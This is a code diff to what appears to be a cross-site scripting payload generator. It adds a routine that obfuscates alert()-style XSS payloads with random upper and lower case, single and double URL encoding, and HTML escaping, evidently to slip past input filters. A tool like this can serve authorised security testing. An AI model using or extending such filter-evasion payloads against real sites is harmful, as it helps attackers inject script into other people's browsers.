@@ -1,3 +1,7 @@
+import random
+import urllib.parse
+import html
+
 image_filepath = "/image/favicon.ico" #change this
 
 base_payload_list = ["alert()","alert;throw 1","alert`1`"]
@@ -81,7 +85,26 @@ obfuscated_payload_list = []
 def obfuscate_payloads():
   global obfuscated_payload_list
   for plain_payload in plain_payload_list:
-    obfuscated_payload_list.append(plain_payload)
+    obfuscated_payload_list.append(randomize_upper_lower(plain_payload))
+    obfuscated_payload_list.append(URLencode(plain_payload))
+    obfuscated_payload_list.append(URLencode(URLencode(plain_payload)))
+    obfuscated_payload_list.append(HTMLescape(plain_payload))
+
+def randomize_upper_lower(payload):
+  obfuscated_payload = ""
+  for letter in payload:
+    if type(letter) is str:
+      if bool(random.getrandbits(1)):
+        new_letter = letter.upper()
+      else:
+        new_letter = letter
+      obfuscated_payload += new_letter
+  return obfuscated_payload
+  
+def URLencode(payload):
+  return urllib.parse.quote(payload)
+def HTMLescape(payload):
+  return html.escape(payload)
 
 build_plain_payloads()
 obfuscate_payloads()
